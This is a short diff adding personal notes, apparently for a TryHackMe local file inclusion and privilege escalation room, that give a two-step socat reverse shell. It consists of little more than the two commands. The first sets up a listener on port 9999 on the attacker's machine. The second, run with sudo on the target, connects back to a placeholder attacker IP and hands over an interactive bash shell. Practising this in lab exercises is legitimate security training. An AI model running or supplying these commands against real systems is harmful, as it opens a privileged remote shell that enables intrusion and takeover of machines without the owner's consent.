@@ -1,0 +1,9 @@
+####################### SOCAT REVERSHELL COMMAND FOR TRY_HACK_ME LFI PRIV_ESK #################
+TO START SOCAT REVERS CONNECTION
+STEP 1 
+    FIRE UP ATTACKER TERMINAL AND SETUP SOCKAT LISTENER
+        $socat file: `tty`,raw,echo=0 tcp-listen:9999
+ 
+STEP 2
+    FIRE UP THE TARGET TERMINAL AND INTIATE THE REVERS CONNECTION
+        $sudo socat tcp-connect:<Attacker_Machine_IP>:9999 exec:bash,pty,stderr,setsid,sigint,sane
